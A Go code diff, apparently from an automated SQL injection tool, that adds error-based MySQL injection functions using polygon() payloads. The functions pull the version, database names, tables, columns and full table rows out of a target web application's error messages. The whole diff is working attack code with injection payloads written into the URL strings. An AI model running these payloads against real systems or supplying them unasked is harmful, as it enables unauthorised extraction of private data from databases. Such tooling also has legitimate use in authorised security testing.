@@ -186,3 +186,132 @@ func GetAllDataByErrorBased(target string, suffix string, database string, table
 	}
 	util.PrintData(util.ConvertInterfaceArray(columns, output))
 }
+
+// GetVersionByErrorBasedPolygon 报错注入方式得到版本
+func GetVersionByErrorBasedPolygon(target string, suffix string) {
+	code, _, tempBody := util.Request(constant.DefaultMethod,
+		target+suffix+constant.PolygonVersionPayload, nil, nil)
+	if code != -1 {
+		body := string(tempBody)
+		if strings.Contains(strings.ToLower(body),
+			strings.ToLower(constant.PolygonErrorKeyword)) {
+			re := regexp.MustCompile(constant.PolygonVersionRegex)
+			res := re.FindAllStringSubmatch(body, -1)
+			log.Info("mysql version:" + res[0][1])
+		}
+	}
+}
+
+// GetCurrentDatabaseByErrorBasedPolygon 报错注入方式得到当前数据库名
+func GetCurrentDatabaseByErrorBasedPolygon(target string, suffix string) {
+	code, _, tempBody := util.Request(constant.DefaultMethod,
+		target+suffix+constant.PolygonDatabasePayload, nil, nil)
+	if code != -1 {
+		body := string(tempBody)
+		if strings.Contains(strings.ToLower(body),
+			strings.ToLower(constant.PolygonErrorKeyword)) {
+			re := regexp.MustCompile(constant.PolygonDatabaseRegex)
+			res := re.FindAllStringSubmatch(body, -1)
+			log.Info("current database:" + res[0][1])
+		}
+	}
+}
+
+// GetAllDatabasesByErrorBasedPolygon 报错注入方式得到所有数据库名
+func GetAllDatabasesByErrorBasedPolygon(target string, suffix string) {
+	code, _, tempBody := util.Request(constant.DefaultMethod,
+		target+suffix+constant.PolygonAllDatabasesPayload, nil, nil)
+	if code != -1 {
+		body := string(tempBody)
+		if strings.Contains(strings.ToLower(body),
+			strings.ToLower(constant.PolygonErrorKeyword)) {
+			re := regexp.MustCompile(constant.PolygonDataRegex)
+			res := re.FindAllStringSubmatch(body, -1)
+			log.Info("get databases success")
+			util.PrintDatabases(util.ConvertString(res[0][1]))
+		}
+	}
+}
+
+// GetAllTablesByErrorBasedPolygon 报错注入根据数据库名获得所有表名
+func GetAllTablesByErrorBasedPolygon(target string, suffix string, database string) {
+	payload := target + suffix + constant.Space + "Or" + constant.Space +
+		"polygon((select%20*%20from(select%20*%20from(select%20" +
+		"group_concat(table_name)%20from%20information_schema." +
+		"tables%20where%20table_schema='" + database + "')a)b))--+"
+	code, _, tempBody := util.Request(constant.DefaultMethod, payload, nil, nil)
+	if code != -1 {
+		body := string(tempBody)
+		if strings.Contains(strings.ToLower(body),
+			strings.ToLower(constant.PolygonErrorKeyword)) {
+			re := regexp.MustCompile(constant.PolygonDataRegex)
+			res := re.FindAllStringSubmatch(body, -1)
+			log.Info("get tables success")
+			util.PrintTables(util.ConvertString(res[0][1]))
+		}
+	}
+}
+
+// GetAllColumnsByErrorBasedPolygon 报错注入根据数据库名和表名获得所有字段
+func GetAllColumnsByErrorBasedPolygon(target string, suffix string, database string, table string) {
+	payload := target + suffix + constant.Space + "Or" + constant.Space +
+		"polygon((select%20*%20from(select%20*%20from(select%20" +
+		"group_concat(column_name)%20from%20information_schema." +
+		"columns%20where%20table_name='" + table +
+		"'%20and%20table_schema='" + database + "')a)b))--+"
+	code, _, tempBody := util.Request(constant.DefaultMethod, payload, nil, nil)
+	if code != -1 {
+		body := string(tempBody)
+		if strings.Contains(strings.ToLower(body),
+			strings.ToLower(constant.PolygonErrorKeyword)) {
+			re := regexp.MustCompile(constant.PolygonDataRegex)
+			res := re.FindAllStringSubmatch(body, -1)
+			log.Info("get columns success")
+			util.PrintColumns(util.ConvertString(res[0][1]))
+		}
+	}
+}
+
+// GetAllDataByErrorBasedPolygon 报错注入根据输入获得所有数据
+func GetAllDataByErrorBasedPolygon(target string, suffix string, database string, table string, columns []string) {
+	start := target + suffix + constant.Space + "Or" + constant.Space +
+		"polygon((select%20*%20from(select%20*%20from(select%20concat("
+	var tempPayload string
+	for _, v := range columns {
+		tempPayload = tempPayload + v + ",0x3a,"
+	}
+	r := []rune(tempPayload)
+	result := string(r[:len(r)-6])
+	var data []string
+	for i := 0; ; i++ {
+		payload := start + result + ")%20from%20" + database + "." + table +
+			"%20limit%20+" + strconv.Itoa(i) + ",1)a)b))--+"
+		code, _, tempBody := util.Request(constant.DefaultMethod, payload, nil, nil)
+		if code != -1 {
+			body := string(tempBody)
+			if strings.Contains(strings.ToLower(body),
+				strings.ToLower(constant.PolygonErrorKeyword)) {
+				re := regexp.MustCompile(constant.PolygonFinalDataRegex)
+				res := re.FindAllStringSubmatch(body, -1)
+				if res != nil {
+					data = append(data, res[0][1])
+				} else {
+					break
+				}
+			} else {
+				break
+			}
+		}
+	}
+	log.Info("get data success")
+	var output [][]string
+	for _, v := range data {
+		var temp []string
+		params := strings.Split(v, ":")
+		for _, innerV := range params {
+			temp = append(temp, innerV)
+		}
+		output = append(output, temp)
+	}
+	util.PrintData(util.ConvertInterfaceArray(columns, output))
+}
